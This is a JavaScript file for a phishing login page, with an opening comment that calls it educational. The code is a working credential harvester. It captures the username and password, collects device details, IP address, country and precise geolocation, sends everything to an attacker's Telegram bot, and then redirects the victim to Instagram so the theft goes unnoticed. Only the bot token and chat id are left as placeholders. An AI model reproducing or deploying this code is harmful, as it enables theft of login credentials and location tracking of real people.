// This page is created to educate the public about phishing and how to prevent it. Please note that using this code for any illegal activities is strictly prohibited. The original code is available at https://github.com/saheermk/
document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    
    // Collect form data
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Collect additional data
    const browserName = navigator.userAgent;
    const deviceName = navigator.platform;
    const dateTime = new Date().toLocaleString();
    const batteryPercentage = await getBatteryPercentage();
    const countryName = await getCountryName();
    const ipv4Address = await getIPv4Address(); // Fetch IPv4 address
    const geolocation = await getGeolocation(); // Fetch geolocation

    // Format the message
    const text = `Device Data:
Browser: ${browserName}
Device: ${deviceName}
Date and Time: ${dateTime}
Battery Percentage: ${batteryPercentage}%
Country: ${countryName}
IPv4 Address: ${ipv4Address || 'N/A'}
Geolocation: ${geolocation || 'N/A'}`;

    // Telegram bot configuration
    const chatId =  'chat_id';
    const botToken = 'bot_token';
    const message = `Username: ${username}\nPassword: ${password}\n${text}`;

    // Send text message to Telegram
    await sendToTelegram(botToken, chatId, message);

    // Simulate form submission and redirection
    setTimeout(function() {
        var errorMessage = document.getElementById('error-message');
        if (!errorMessage || errorMessage.style.display === 'none') {
            window.location.href = 'https://www.instagram.com';
        } else {
            console.error('Form submission error detected.');
        }
    }, 1000); // Adjust the delay as needed for processing
});

// Function to get battery percentage
async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.round(battery.level * 100);
    } catch (error) {
        console.error('Error getting battery percentage:', error);
        return 'N/A';
    }
}

// Function to get country name using IP address
async function getCountryName() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return data.country_name || 'Unknown';
    } catch (error) {
        console.error('Error fetching country name:', error);
        return 'Unknown';
    }
}

// Function to get IPv4 address
async function getIPv4Address() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'N/A';
    } catch (error) {
        console.error('Error fetching IPv4 address:', error);
        return 'N/A';
    }
}

// Function to get geolocation
async function getGeolocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            resolve('Geolocation not supported');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
            },
            (error) => {
                console.error('Error fetching geolocation:', error);
                resolve('Geolocation access denied or unavailable');
            }
        );
    });
}

// Function to send text message to Telegram
async function sendToTelegram(botToken, chatId, message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
        const data = await response.json();
        if (data.ok) {
            console.log('Text message sent successfully!');
        } else {
            console.error('Failed to send text message.');
        }
    } catch (error) {
        console.error('Error sending text message:', error);
    }
}

// Get the current year
const currentYear = new Date().getFullYear();
const yearElement = document.getElementById('current-year');
if (yearElement) {
    yearElement.textContent = currentYear;
}